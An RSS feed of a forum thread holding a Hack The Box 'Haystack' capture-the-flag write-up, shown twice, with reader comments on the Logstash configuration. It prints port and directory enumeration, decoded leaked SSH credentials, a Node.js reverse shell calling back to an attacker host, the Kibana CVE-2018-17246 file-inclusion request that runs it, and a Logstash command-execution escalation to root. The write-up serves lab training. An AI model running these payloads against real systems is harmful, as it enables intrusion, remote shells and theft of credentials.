<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Hack The Box - Haystack</title>
    <link>https://d.clarkee.co.uk/t/hack-the-box-haystack/17303</link>
    <description>![](upload://4R4ppBzjzDNt2Kqyggs4I3fqZOl.png)

We start by running nmap, with the following options:

&gt; root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115

I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:

    PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                      
    22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
    80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
    | http-methods:
    |_  Supported Methods: GET HEAD
    |_http-server-header: nginx/1.12.2
    |_http-title: Site doesn&#39;t have a title (text/html).
    9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
    |_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
    | http-methods:
    |   Supported Methods: HEAD GET DELETE OPTIONS
    |_  Potentially risky methods: DELETE
    |_http-server-header: nginx/1.12.2
    |_http-title: Site doesn&#39;t have a title (application/json; charset=UTF-8).

On port 80, it’s just a page with an image of a needle in a haystack.

But since this is HTB, it’s worth having a quick look for any steganography. `strings` doesn’t reveal anything, but `xxd` does, at the very end of the file:

    0002ca80: 8a00 28a2 8a00 28a2 8a00 28a2 8a00 28a2  ..(...(...(...(.
    0002ca90: 8a00 28a2 8a00 ffd9 0a62 4745 6759 5764  ..(......bGEgYWd
    0002caa0: 3161 6d45 675a 5734 675a 5777 6763 4746  1amEgZW4gZWwgcGF
    0002cab0: 7159 5849 675a 584d 6749 6d4e 7359 585a  qYXIgZXMgImNsYXZ
    0002cac0: 6c49 673d 3d0a                           lIg==.

That looks like base64, so let us decode that:

&gt; root@flagship:~# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d
&gt; la aguja en el pajar es &quot;clave&quot;

Spanish for *the needle in the page is “key”* or perhaps literally, *clave* .

Since there doesn’t appear to be anything else to do with the image, let’s have a look at port 9200. If we access it, we get the following:

    root@flagship:~/htb/jarvis# curl http://10.10.10.115:9200/
    {
      &quot;name&quot; : &quot;iQEYHgS&quot;,
      &quot;cluster_name&quot; : &quot;elasticsearch&quot;,
      &quot;cluster_uuid&quot; : &quot;pjrX7V_gSFmJY-DxP4tCQg&quot;,
      &quot;version&quot; : {
        &quot;number&quot; : &quot;6.4.2&quot;,
        &quot;build_flavor&quot; : &quot;default&quot;,
        &quot;build_type&quot; : &quot;rpm&quot;,
        &quot;build_hash&quot; : &quot;04711c2&quot;,
        &quot;build_date&quot; : &quot;2018-09-26T13:34:09.098244Z&quot;,
        &quot;build_snapshot&quot; : false,
        &quot;lucene_version&quot; : &quot;7.4.0&quot;,
        &quot;minimum_wire_compatibility_version&quot; : &quot;5.6.0&quot;,
        &quot;minimum_index_compatibility_version&quot; : &quot;5.0.0&quot;
      },
      &quot;tagline&quot; : &quot;You Know, for Search&quot;
    }

So we’re dealing with an ElasticSearch instance, version 6.4.2. If you aren’t familiar with it, this is a good starting point: [ElasticSearch 101](http://joelabrahamsson.com/elasticsearch-101/). However, the relevant part here is that URLs are expected to be in the format of `http://10.10.10.115:9200/&lt;index&gt;/&lt;type&gt;/&lt;id&gt;` , so we can try to find which indices are available with gobuster:

    root@flagship:~# gobuster dir -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.10.115:9200/
    [+] Threads:        10
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Timeout:        10s
    ===============================================================
    2019/09/07 21:21:02 Starting gobuster
    ===============================================================
    /quotes (Status: 200)
    /bank (Status: 200)

Knowing that the indices `quotes` and `bank` exist, we then need to find types which have indices. Gobuster won’t cut it for this, as we want to look for `http://10.10.10.115:9200/quotes/&lt;type&gt;/1` and `http://10.10.10.115:9200/bank/&lt;type&gt;/1` , so we turn to wfuzz:

    root@flagship:~# wfuzz -u http://10.10.10.115:9200/quotes/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
    ********************************************************
    * Wfuzz 2.3.4 - The Web Fuzzer                         *
    ********************************************************
    Target: http://10.10.10.115:9200/quotes/FUZZ/1
    Total requests: 220560
    ==================================================================
    ID   Response   Lines      Word         Chars          Payload
    ==================================================================
    000826:  C=200      0 L       63 W          462 Ch        &quot;quote&quot;

And then we repeat the same for `bank`: 

    root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
    ********************************************************
    * Wfuzz 2.3.4 - The Web Fuzzer                         *
    ********************************************************
    Target: http://10.10.10.115:9200/bank/FUZZ/1
    Total requests: 220560
    ==================================================================
    ID   Response   Lines      Word         Chars          Payload
    ==================================================================
    000349:  C=200      0 L        3 W          286 Ch        &quot;account&quot;

Now that we know two types, we just have to identify what valid ids there are. Again, wfuzz can do this by using a range iterator:

&gt; root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/account/FUZZ -z range,1-2000 --hc 404
&gt; root@orbital:~# wfuzz -u http://10.10.10.115:9200/quotes/quote/FUZZ -z range,1-2000 --hc 404

This will show us that there are 999 valid ids – which we can then download using our trusty curl for further analysis.

&gt; root@flagship:~# curl &quot;http://10.10.10.115:9200/bank/accounts/[1-999]&quot; -o &quot;accounts/#1&quot;
&gt; root@flagship:~# curl &quot;http://10.10.10.115:9200/quotes/quote/[1-999]&quot; -o &quot;quotes/#1&quot;

I didn’t find any useful information in the nearly 2000 files when blindly searching for credentials, but using what we’ve got from the image we get the following:

&gt; root@flagship:~# grep -r clave *
&gt; quotes/45.html:{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;45&quot;,&quot;_version&quot;:1,&quot;found&quot;:true,&quot;_source&quot;:{&quot;quote&quot;:&quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;}}
&gt; quotes/111.html:{&quot;_index&quot;:&quot;quotes&quot;,&quot;_type&quot;:&quot;quote&quot;,&quot;_id&quot;:&quot;111&quot;,&quot;_version&quot;:1,&quot;found&quot;:true,&quot;_source&quot;:{&quot;quote&quot;:&quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;}}

With some more base64-looking strings, we decode them as before:

    root@flagship:~# echo dXNlcjogc2VjdXJpdHkg | base64 -d
    user: security 
    root@flagship:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
    pass: spanish.is.key

With these credentials, we can login via SSH and grab the user flag.

&gt; root@flagship:~# ssh security@10.10.10.115
&gt; security@10.10.10.115&#39;s password:
&gt; [security@haystack ~]$ ls
&gt; user.txt

Now that we have a foothold, the next step is to run [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) and see if that gives us anything interesting to go on. Thankfully, since we already have SSH access, we can just copy it over with scp rather anything more elaborate.

From a cursory look at the results from LSE, we can see this server is running an ELK stack ([ElasticSearch](https://www.elastic.co/products/elasticsearch), [Logstash](https://www.elastic.co/products/logstash), [Kibana](https://www.elastic.co/products/kibana)), with matching user accounts. Additionally, Logstash is running as root and is a likely escalation point.

It also looks like the following ports can be accessed internally: 5601 (Kibana), 9000 and 9300 (both ElasticSearch). 5601 is particularly interesting as it wasn’t available remotely.

Since we know we’re running ElasticSearch 6.4.2, it’s worth checking if there are any issues we can leverage. [Looking for vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-13554/Elasticsearch.html) the very first one seems relevant: [CVE-2018-17246](https://www.cvedetails.com/cve/CVE-2018-17246/) (detailed explanation [here](https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/)).

It looks like we might get an LFI using this, which would then let us gain access to the kibana user. We can get a viable node reverse shell from [here](https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell):

    (function(){
        var net = require(&quot;net&quot;),
            cp = require(&quot;child_process&quot;),
            sh = cp.spawn(&quot;/bin/sh&quot;, []);
        var client = new net.Socket();
        client.connect(8080, &quot;192.168.33.1&quot;, function(){
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        });
        return /a/; // Prevents the Node.js application form crashing
    })();

We copy this to haystack (in my case, I copied it to /tmp) and call the vulnerable endpoint:

    [security@haystack tmp]$ curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../tmp/hn1.js  

An on our attacking machine we get a callback:

    root@flagship:~/shared.node/htb# nc -lvp 1337
    listening on [any] 1337 ...
    10.10.10.115: inverse host lookup failed: Unknown host
    connect to [10.10.16.40] from (UNKNOWN) [10.10.10.115] 52436
    whoami
    kibana

And then we upgrade our shell into something a bit more usable:

    python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;  
    bash-4.2$

We know that logstash runs as root, so that is probably our way in. The normal flow for a simple ELK stack is that data from ElasticSearch gets processed by LogStash and then presented by Kibana, and we can find that step in `/etc/logstash/conf.d`. The folder is only accessible now that we are logged in as the kibana user. However, although the files can be read, they can’t be modified.

## input.conf

    input {
             file {
                     path =&gt; &quot;/opt/kibana/logstash_*&quot;
                     start_position =&gt; &quot;beginning&quot;
                     sincedb_path =&gt; &quot;/dev/null&quot;
                     stat_interval =&gt; &quot;10 second&quot;
                     type =&gt; &quot;execute&quot;
                     mode =&gt; &quot;read&quot;
             }
     }

## filter.conf

    filter {
            if [type] == &quot;execute&quot; {
                    grok {
                            match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
                    }
            }
    }

## output.conf

    output {
            if [type] == &quot;execute&quot; {
                    stdout { codec =&gt; json }
                    exec {
                            command =&gt; &quot;%{comando} &amp;&quot;
                    }
            }
    }

From reading these files, we can see that it takes input files in the folder /opt/kibana/, with the filename having to start with logstash_. The contents of the file have to be Ejecutar comando : followed by the command we want to execute.

Since we know what we want to get out is the root flag, we can do the following:

    bash-4.2$ echo Ejecutar comando : cp /root/root.txt /tmp/root.txt &gt; /tmp/logstash_root
    bash-4.2$ echo Ejecutar comando : chmod 777 /tmp/root.txt &gt; logstash_root2

And within ten seconds our commands will get executed:

    bash-4.2$ wc -c /tmp/root.txt&lt;br&gt;
    wc -c /tmp/root.txt&lt;br&gt;
    33 /tmp/root.txt

Hopefully this was useful to someone :)</description>
    
    <lastBuildDate>Tue, 05 Nov 2019 10:04:03 +0000</lastBuildDate>
    <category>Hackthebox Writeups</category>
    <atom:link href="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Hack The Box - Haystack</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/4</link>
        <pubDate>Thu, 05 Mar 2020 07:20:17 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-17303-4</guid>
        <source url="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
      </item>
      <item>
        <title>Hack The Box - Haystack</title>
        <dc:creator><![CDATA[hostile.node]]></dc:creator>
        <description><![CDATA[
            <p>Hey Pry0cc, thanks for the comment.</p>
<p>When I realised ELK was a major stack, I spent some time reading through the documentation of all three components. The <a href="https://www.elastic.co/products/logstash" rel="nofollow noopener">https://www.elastic.co/products/logstash</a> landing page provides a high-level overview regarding how the inputs, filters and outputs fit together.</p>
<p>From there I went into the documentation, <a href="https://www.elastic.co/guide/en/logstash/current/pipeline.html" rel="nofollow noopener">https://www.elastic.co/guide/en/logstash/current/pipeline.html</a>. I can’t say I went into full detail into how each of the plugins in the .conf files work but I’ve been doing dev for quite a few years so I’ve run into a number of domain specific languages, so I understood the general flow of what was happening here.</p>
<p>Broadly:</p>
<h2>input.conf</h2>
<pre><code class="lang-auto">input {
         file { # So, checking for some files?
                 # Which are in /opt/kibana/ and have a filename starting with 
                 # logstash_*
                 path =&gt; "/opt/kibana/logstash_*"
                 # Iterating through all the files in the folder?
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null" # Dunno!
                 # Stat is a POSIX function (https://linux.die.net/man/2/stat) for 
                 # getting information about a file, so it's probably checking every 
                 # file in the directory every 10 seconds to see if it has changed.
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute" # And it's going to be executing something?
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2>filter.conf</h2>
<pre><code class="lang-auto">filter {
        # I guess this is what it is executing! As this is a filter, it means that 
        # all the inputs will come through the filter, and only if they pass the 
        # filter conditions will they get transformed and sent to the output.
        if [type] == "execute" {
                grok {
                        # So, regular expression match test. The message has 
                        # to start with "Ejecutar comando: ",
                        # and then whatever comes after ({GREEDYDATA} gets 
                        # shoved into a variable called "comando".
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2>output.conf</h2>
<pre><code class="lang-auto">output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                # Anything that passes the filter gets sent into the exec plugin.
                exec {
                        # Which executes whatever is in the "comando" variable 
                        # as a background task.
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>Hopefully that’s helpful <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Someone who is familiar with Logstash or has spent more time than I going through the documentation can likely point out that some of comments aren’t accurate, but that is the broad shape of what is happening.</p>
          <p><a href="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/3</link>
        <pubDate>Tue, 05 Nov 2019 09:59:46 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-17303-3</guid>
        <source url="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
      </item>
      <item>
        <title>Hack The Box - Haystack</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Nice writeup!</p>
<p>Thanks for sharing, very concise <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I’d love more explanation of the root, I struggled with this root and found it from trial and error. Any documentation of logstash itself?</p>
          <p><a href="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/2</link>
        <pubDate>Mon, 04 Nov 2019 21:29:19 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-17303-2</guid>
        <source url="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
      </item>
      <item>
        <title>Hack The Box - Haystack</title>
        <dc:creator><![CDATA[hostile.node]]></dc:creator>
        <description><![CDATA[
            <p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://d.clarkee.co.uk/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" data-download-href="/uploads/short-url/4R4ppBzjzDNt2Kqyggs4I3fqZOl.png?dl=1" title=""><img src="/uploads/default/original/2X/2/22087bc90213dba4f6bf2c46d9fe24b3d60906e5.png" alt="" data-base62-sha1="4R4ppBzjzDNt2Kqyggs4I3fqZOl" role="presentation" width="589" height="334"></a></div><p></p>
<p>We start by running nmap, with the following options:</p>
<blockquote>
<p>root@flagship:~# nmap -p- -T4 -oN notes -A 10.10.10.115</p>
</blockquote>
<p>I always run it with -p-, which will scan all 65536 ports, rather than just the 1000 most common. And in this case, we see a few open ports:</p>
<pre><code>PORT     STATE SERVICE REASON         VERSION                                                                                                                                                                      
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 nginx 1.12.2
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (text/html).
9200/tcp open  http    syn-ack ttl 63 nginx 1.12.2
|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
| http-methods:
|   Supported Methods: HEAD GET DELETE OPTIONS
|_  Potentially risky methods: DELETE
|_http-server-header: nginx/1.12.2
|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
</code></pre>
<p>On port 80, it’s just a page with an image of a needle in a haystack.</p>
<p>But since this is HTB, it’s worth having a quick look for any steganography. <code>strings</code> doesn’t reveal anything, but <code>xxd</code> does, at the very end of the file:</p>
<pre><code>0002ca80: 8a00 28a2 8a00 28a2 8a00 28a2 8a00 28a2  ..(...(...(...(.
0002ca90: 8a00 28a2 8a00 ffd9 0a62 4745 6759 5764  ..(......bGEgYWd
0002caa0: 3161 6d45 675a 5734 675a 5777 6763 4746  1amEgZW4gZWwgcGF
0002cab0: 7159 5849 675a 584d 6749 6d4e 7359 585a  qYXIgZXMgImNsYXZ
0002cac0: 6c49 673d 3d0a                           lIg==.
</code></pre>
<p>That looks like base64, so let us decode that:</p>
<blockquote>
<p>root@flagship:~# echo bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg== | base64 -d<br>
la aguja en el pajar es “clave”</p>
</blockquote>
<p>Spanish for <em>the needle in the page is “key”</em> or perhaps literally, <em>clave</em> .</p>
<p>Since there doesn’t appear to be anything else to do with the image, let’s have a look at port 9200. If we access it, we get the following:</p>
<pre><code>root@flagship:~/htb/jarvis# curl http://10.10.10.115:9200/
{
  "name" : "iQEYHgS",
  "cluster_name" : "elasticsearch",
  "cluster_uuid" : "pjrX7V_gSFmJY-DxP4tCQg",
  "version" : {
    "number" : "6.4.2",
    "build_flavor" : "default",
    "build_type" : "rpm",
    "build_hash" : "04711c2",
    "build_date" : "2018-09-26T13:34:09.098244Z",
    "build_snapshot" : false,
    "lucene_version" : "7.4.0",
    "minimum_wire_compatibility_version" : "5.6.0",
    "minimum_index_compatibility_version" : "5.0.0"
  },
  "tagline" : "You Know, for Search"
}
</code></pre>
<p>So we’re dealing with an ElasticSearch instance, version 6.4.2. If you aren’t familiar with it, this is a good starting point: <a href="http://joelabrahamsson.com/elasticsearch-101/" rel="noopener nofollow ugc">ElasticSearch 101</a>. However, the relevant part here is that URLs are expected to be in the format of <code>http://10.10.10.115:9200/&lt;index&gt;/&lt;type&gt;/&lt;id&gt;</code> , so we can try to find which indices are available with gobuster:</p>
<pre><code>root@flagship:~# gobuster dir -u http://10.10.10.115:9200/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.115:9200/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/09/07 21:21:02 Starting gobuster
===============================================================
/quotes (Status: 200)
/bank (Status: 200)
</code></pre>
<p>Knowing that the indices <code>quotes</code> and <code>bank</code> exist, we then need to find types which have indices. Gobuster won’t cut it for this, as we want to look for <code>http://10.10.10.115:9200/quotes/&lt;type&gt;/1</code> and <code>http://10.10.10.115:9200/bank/&lt;type&gt;/1</code> , so we turn to wfuzz:</p>
<pre><code>root@flagship:~# wfuzz -u http://10.10.10.115:9200/quotes/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/quotes/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000826:  C=200      0 L       63 W          462 Ch        "quote"
</code></pre>
<p>And then we repeat the same for <code>bank</code>:</p>
<pre><code>root@orbital:~# wfuzz -u http://10.10.10.115:9200/bank/FUZZ/1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************
Target: http://10.10.10.115:9200/bank/FUZZ/1
Total requests: 220560
==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================
000349:  C=200      0 L        3 W          286 Ch        "account"
</code></pre>
<p>Now that we know two types, we just have to identify what valid ids there are. Again, wfuzz can do this by using a range iterator:</p>
<blockquote>
<p>root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/bank/account/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/account/FUZZ</a> -z range,1-2000 --hc 404<br>
root@orbital:~# wfuzz -u <a href="http://10.10.10.115:9200/quotes/quote/FUZZ" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/FUZZ</a> -z range,1-2000 --hc 404</p>
</blockquote>
<p>This will show us that there are 999 valid ids – which we can then download using our trusty curl for further analysis.</p>
<blockquote>
<p>root@flagship:~# curl “<a href="http://10.10.10.115:9200/bank/accounts/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/bank/accounts/[1-999]</a>” -o “accounts/<span class="hashtag-raw">#1</span>”<br>
root@flagship:~# curl “<a href="http://10.10.10.115:9200/quotes/quote/%5B1-999%5D" rel="noopener nofollow ugc">http://10.10.10.115:9200/quotes/quote/[1-999]</a>” -o “quotes/<span class="hashtag-raw">#1</span>”</p>
</blockquote>
<p>I didn’t find any useful information in the nearly 2000 files when blindly searching for credentials, but using what we’ve got from the image we get the following:</p>
<blockquote>
<p>root@flagship:~# grep -r clave *<br>
quotes/45.html:{“_index”:“quotes”,“_type”:“quote”,“_id”:“45”,“_version”:1,“found”:true,“_source”:{“quote”:“Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg “}}<br>
quotes/111.html:{”_index”:“quotes”,“_type”:“quote”,“_id”:“111”,“_version”:1,“found”:true,“_source”:{“quote”:“Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=”}}</p>
</blockquote>
<p>With some more base64-looking strings, we decode them as before:</p>
<pre><code>root@flagship:~# echo dXNlcjogc2VjdXJpdHkg | base64 -d
user: security 
root@flagship:~# echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
pass: spanish.is.key
</code></pre>
<p>With these credentials, we can login via SSH and grab the user flag.</p>
<blockquote>
<p>root@flagship:~# ssh <a href="mailto:security@10.10.10.115">security@10.10.10.115</a><br>
<a href="mailto:security@10.10.10.115">security@10.10.10.115</a>’s password:<br>
[security@haystack ~]$ ls<br>
user.txt</p>
</blockquote>
<p>Now that we have a foothold, the next step is to run <a href="https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh" rel="noopener nofollow ugc">Linux Smart Enumeration</a> and see if that gives us anything interesting to go on. Thankfully, since we already have SSH access, we can just copy it over with scp rather anything more elaborate.</p>
<p>From a cursory look at the results from LSE, we can see this server is running an ELK stack (<a href="https://www.elastic.co/products/elasticsearch" rel="noopener nofollow ugc">ElasticSearch</a>, <a href="https://www.elastic.co/products/logstash" rel="noopener nofollow ugc">Logstash</a>, <a href="https://www.elastic.co/products/kibana" rel="noopener nofollow ugc">Kibana</a>), with matching user accounts. Additionally, Logstash is running as root and is a likely escalation point.</p>
<p>It also looks like the following ports can be accessed internally: 5601 (Kibana), 9000 and 9300 (both ElasticSearch). 5601 is particularly interesting as it wasn’t available remotely.</p>
<p>Since we know we’re running ElasticSearch 6.4.2, it’s worth checking if there are any issues we can leverage. <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-13554/Elasticsearch.html" rel="noopener nofollow ugc">Looking for vulnerabilities</a> the very first one seems relevant: <a href="https://www.cvedetails.com/cve/CVE-2018-17246/" rel="noopener nofollow ugc">CVE-2018-17246</a> (detailed explanation <a href="https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/" rel="noopener nofollow ugc">here</a>).</p>
<p>It looks like we might get an LFI using this, which would then let us gain access to the kibana user. We can get a viable node reverse shell from <a href="https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell" rel="noopener nofollow ugc">here</a>:</p>
<pre><code>(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.33.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
</code></pre>
<p>We copy this to haystack (in my case, I copied it to /tmp) and call the vulnerable endpoint:</p>
<pre><code>[security@haystack tmp]$ curl 127.0.0.1:5601/api/console/api_server?apis=../../../../../../../../../../tmp/hn1.js  
</code></pre>
<p>An on our attacking machine we get a callback:</p>
<pre><code>root@flagship:~/shared.node/htb# nc -lvp 1337
listening on [any] 1337 ...
10.10.10.115: inverse host lookup failed: Unknown host
connect to [10.10.16.40] from (UNKNOWN) [10.10.10.115] 52436
whoami
kibana
</code></pre>
<p>And then we upgrade our shell into something a bit more usable:</p>
<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'  
bash-4.2$
</code></pre>
<p>We know that logstash runs as root, so that is probably our way in. The normal flow for a simple ELK stack is that data from ElasticSearch gets processed by LogStash and then presented by Kibana, and we can find that step in <code>/etc/logstash/conf.d</code>. The folder is only accessible now that we are logged in as the kibana user. However, although the files can be read, they can’t be modified.</p>
<h2><a name="p-49100-inputconf-1" class="anchor" href="https://d.clarkee.co.uk#p-49100-inputconf-1"></a>input.conf</h2>
<pre><code>input {
         file {
                 path =&gt; "/opt/kibana/logstash_*"
                 start_position =&gt; "beginning"
                 sincedb_path =&gt; "/dev/null"
                 stat_interval =&gt; "10 second"
                 type =&gt; "execute"
                 mode =&gt; "read"
         }
 }
</code></pre>
<h2><a name="p-49100-filterconf-2" class="anchor" href="https://d.clarkee.co.uk#p-49100-filterconf-2"></a>filter.conf</h2>
<pre><code>filter {
        if [type] == "execute" {
                grok {
                        match =&gt; { "message" =&gt; "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
                }
        }
}
</code></pre>
<h2><a name="p-49100-outputconf-3" class="anchor" href="https://d.clarkee.co.uk#p-49100-outputconf-3"></a>output.conf</h2>
<pre><code>output {
        if [type] == "execute" {
                stdout { codec =&gt; json }
                exec {
                        command =&gt; "%{comando} &amp;"
                }
        }
}
</code></pre>
<p>From reading these files, we can see that it takes input files in the folder /opt/kibana/, with the filename having to start with logstash_. The contents of the file have to be Ejecutar comando : followed by the command we want to execute.</p>
<p>Since we know what we want to get out is the root flag, we can do the following:</p>
<pre><code>bash-4.2$ echo Ejecutar comando : cp /root/root.txt /tmp/root.txt &gt; /tmp/logstash_root
bash-4.2$ echo Ejecutar comando : chmod 777 /tmp/root.txt &gt; logstash_root2
</code></pre>
<p>And within ten seconds our commands will get executed:</p>
<pre><code>bash-4.2$ wc -c /tmp/root.txt&lt;br&gt;
wc -c /tmp/root.txt&lt;br&gt;
33 /tmp/root.txt
</code></pre>
<p>Hopefully this was useful to someone <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hack-the-box-haystack/17303/1</link>
        <pubDate>Mon, 04 Nov 2019 15:20:13 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-17303-1</guid>
        <source url="https://d.clarkee.co.uk/t/hack-the-box-haystack/17303.rss">Hack The Box - Haystack</source>
      </item>
  </channel>
</rss>
